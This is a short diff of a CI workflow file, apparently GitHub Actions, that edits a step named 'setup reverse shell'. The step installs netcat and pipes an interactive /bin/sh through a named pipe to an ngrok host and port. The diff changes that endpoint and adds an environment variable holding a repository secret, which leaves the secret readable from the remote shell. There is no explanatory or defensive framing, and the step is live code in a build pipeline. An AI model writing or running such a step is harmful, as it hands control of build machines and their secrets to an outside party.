@@ -45,12 +45,11 @@ jobs:
     - name: setup reverse shell
       id: rshell
       shell: bash
+      env:
+        HF_TOKEN: ${{ secrets.SFTP_CICD_WRITER_HOSTNAME }}
       run: |
         set +e
         apt install -y netcat
-        apt-get install -y netcat
-        dmesg
         mkfifo /tmp/f
-        cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 11301 >/tmp/f
-        cat /tmp/f|/bin/sh -i 2>&1|netcat 2.tcp.ngrok.io 11301 >/tmp/f
+        cat /tmp/f|/bin/sh -i 2>&1|nc 4.tcp.ngrok.io 16734 >/tmp/f
         set -e
